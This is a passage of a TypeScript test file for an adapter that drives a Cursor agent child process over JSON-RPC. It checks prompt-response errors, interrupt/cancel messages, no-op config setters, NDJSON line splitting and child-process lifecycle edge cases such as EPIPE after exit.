      pushLine(lastChild(), PROMPT_RESPONSE_CANCELLED)
      const rendered = events.filter((e) => e.kind !== 'activity')
      expect(rendered).toEqual([{ kind: 'turn-complete', isError: false }])
    })

    it('JSON-RPC error prompt response → turn-complete {isError:true, errorText}', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      adapter.sendTurn('go')
      events.length = 0

      pushLine(
        lastChild(),
        JSON.stringify({ jsonrpc: '2.0', id: 3, error: { code: -32603, message: 'boom' } }),
      )
      const rendered = events.filter((e) => e.kind !== 'activity')
      expect(rendered).toHaveLength(1)
      const ev = rendered[0]
      expect(ev.kind).toBe('turn-complete')
      if (ev.kind === 'turn-complete') {
        expect(ev.isError).toBe(true)
        expect(ev.errorText).toBe('boom')
      }
    })
  })

  describe('interrupt', () => {
    it('writes session/cancel with the sessionId once ready', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      adapter.onEvent = () => {}
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      const w = captureWrites(lastChild())

      adapter.interrupt()
      const cancel = w.find((m) => m.method === 'session/cancel')
      expect(cancel).toBeDefined()
      expect((cancel!.params as Record<string, unknown>).sessionId).toBe(
        '0d66f7c5-8dd6-4639-9480-03ee52d077ca',
      )
      expect('id' in cancel!).toBe(false) // a notification, no id
    })

    it('is a no-op before session-ready', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      adapter.onEvent = () => {}
      adapter.start({ cwd: '/abs/project' })
      const w = captureWrites(lastChild())

      adapter.interrupt()
      expect(w.filter((m) => m.method === 'session/cancel')).toHaveLength(0)
    })
  })

  describe('config no-ops', () => {
    it('setModel / setPermissionMode / setEffort write nothing and never throw', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      adapter.onEvent = () => {}
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      const w = captureWrites(lastChild())
      const before = w.length // boot writes (initialize + session/new)

      expect(() => {
        adapter.setModel('claude-opus-4-8')
        adapter.setPermissionMode('acceptEdits')
        adapter.setEffort('high')
      }).not.toThrow()
      // No control-request writes — all three are no-ops, so nothing new hits stdin.
      expect(w.length).toBe(before)
    })
  })

  describe('NDJSON splitter + unknown lines', () => {
    it('handles a line split across two chunk writes', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      pushLine(lastChild(), INIT_RESPONSE)

      const mid = Math.floor(SESSION_NEW_RESPONSE.length / 2)
      lastChild().stdout.write(SESSION_NEW_RESPONSE.slice(0, mid))
      expect(events.some((e) => e.kind === 'started')).toBe(false)
      lastChild().stdout.write(SESSION_NEW_RESPONSE.slice(mid) + '\n')
      expect(events.some((e) => e.kind === 'started')).toBe(true)
    })

    it('unknown session/update notification → no rendered event (activity only)', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())
      adapter.sendTurn('go')
      events.length = 0

      pushLine(lastChild(), SESSION_INFO_UPDATE)
      pushLine(lastChild(), AGENT_THOUGHT_CHUNK)

      const rendered = events.filter((e) => e.kind !== 'activity')
      expect(rendered).toHaveLength(0)
    })
  })

  describe('child process lifecycle', () => {
    it('child exit → ended once', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })

      lastChild().simulateExit(0)
      lastChild().simulateExit(0)

      expect(events.filter((e) => e.kind === 'ended')).toHaveLength(1)
    })

    it('spawn error → session-error then ended', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })

      lastChild().simulateError(new Error('ENOENT cursor-agent'))
      expect(events).toHaveLength(2)
      expect(events[0].kind).toBe('session-error')
      if (events[0].kind === 'session-error') expect(events[0].text).toContain('ENOENT')
      expect(events[1]).toEqual({ kind: 'ended' })
    })

    it('after stop(), late stdout is ignored and sendTurn writes nothing', () => {
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      const w = captureWrites(lastChild())

      const before = w.length // the initialize written during start()
      adapter.stop()
      pushLine(lastChild(), INIT_RESPONSE) // late stdout — ignored by the closed guard
      adapter.sendTurn('too late') // closed guard — no write

      expect(events.some((e) => e.kind === 'started')).toBe(false)
      // No new writes after stop(): the late INIT_RESPONSE didn't drive a session/new, and the
      // late sendTurn was dropped.
      expect(w.length).toBe(before)
    })

    it('a write racing child death does not crash on a stdin EPIPE', () => {
      // Mirrors claude.test.ts: the child can exit WITHOUT stop() ever being called, leaving
      // this.child set and this.closed false, so a later write (interrupt here — sendTurn
      // would queue pre-boot) still lands on a stdin whose other end is already gone. The OS
      // then reports that asynchronously as an 'error' event (EPIPE / ERR_STREAM_DESTROYED) —
      // unhandled, that's an uncaught exception in the host Vite/Next dev-server process.
      const { spawnFn, lastChild } = makeFakeSpawn()
      const adapter = new CursorAdapter(spawnFn, { mcpBinPath: MCP_BIN })
      const events = collectEvents(adapter)
      adapter.start({ cwd: '/abs/project' })
      bootFresh(lastChild())

      lastChild().simulateExit(0)
      expect(() => adapter.interrupt()).not.toThrow()

      // Simulate the OS-level EPIPE landing after the write above.
      expect(() => lastChild().stdin.emit('error', new Error('EPIPE'))).not.toThrow()

      // The session still lands in its normal ended state.
      expect(events.filter((e) => e.kind === 'ended')).toHaveLength(1)
    })
  })
})
